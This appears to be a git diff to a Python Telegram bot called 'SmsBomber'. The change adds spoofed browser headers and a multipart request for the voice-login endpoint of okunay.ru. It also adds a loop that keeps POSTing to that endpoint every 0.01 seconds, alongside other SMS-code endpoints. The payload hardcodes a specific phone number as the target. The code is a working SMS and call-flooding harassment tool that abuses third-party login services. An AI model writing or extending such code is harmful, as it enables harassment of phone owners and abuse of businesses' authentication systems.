@@ -217,6 +217,24 @@ headers_rshb = {
     'x-b3-traceid': '872ceb8571dde260',
 }
 
+headers_okunay = {
+    'Accept': '*/*',
+    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+    'Connection': 'keep-alive',
+    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryaPrnDpO48mQNUBoX',
+    # 'Cookie': '_ym_uid=1698484868679935137; _ym_d=1698484868; _ym_isad=2; _ym_visorc=w',
+    'Origin': 'https://okunay.ru',
+    'Referer': 'https://okunay.ru/',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+    'X-Requested-With': 'XMLHttpRequest',
+    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+}
+
 @bot.message_handler(commands=['start'])
 def start_func(message):
     bot.send_message(message.chat.id, 'Привет, это SmsBomber !', parse_mode='Markdown', reply_markup=spam_markup)
@@ -310,8 +328,12 @@ def data_links(number):
     data1 = {'phonef' : str(num1),
             'agree' : 'on'}
 
-    link2 = 'https://okunay.ru/ajax?method=auth.login_voice'
-    data2 = {'phone' : str(num3)}
+    link2 = 'https://okunay.ru/ajax'
+    params2 = {
+    'method': 'auth.login_voice',
+    }
+
+    data2= '------WebKitFormBoundaryaPrnDpO48mQNUBoX\r\nContent-Disposition: form-data; name="phone"\r\n\r\n+7 (906) 488-77-38\r\n------WebKitFormBoundaryaPrnDpO48mQNUBoX--\r\n'
 
 
     link4 = 'https://api.sushifox.ru/web/auth/sendCode?client_device_type=web&uuid=6FmnD4_IzI_im6hWkowPp'
@@ -491,13 +513,20 @@ def data_links(number):
     }
 
     data1223 = {'phone' : str(num7)} # задержка 5 минут (вроде)
-    return link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24,  data1, data2,  data4, data5, data6, data7, data8,  data10,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24
+    return link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24,  data1, data2,  data4, data5, data6, data7, data8,  data10,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24, params2
 
 def sms_one(): 
-    link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24, data1, data2,  data4, data5, data6, data7, data8,  data10 ,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24 = data_links(number)
+    link1, link2,  link4, link5, link6, link7, link8,  link10,  link12, link13, link14, link15, link16, link17, link18, link19, link20, link21, link22, link23, link24, data1, data2,  data4, data5, data6, data7, data8,  data10 ,  data13, data14, data15, data16, data17, json_data111, data18, data19, number_call, data20, data1223, data21, data22, data23, data24, params2 = data_links(number)
     
     global lst
     while Flag:
+        
+        try:
+            requests.post('https://okunay.ru/ajax', params=params2, headers=headers_okunay, data=data2)
+        except:
+            pass 
+        sleep(0.01)
+        
         try:
             requests.post(link6, data=data6, headers=headers)
         except:
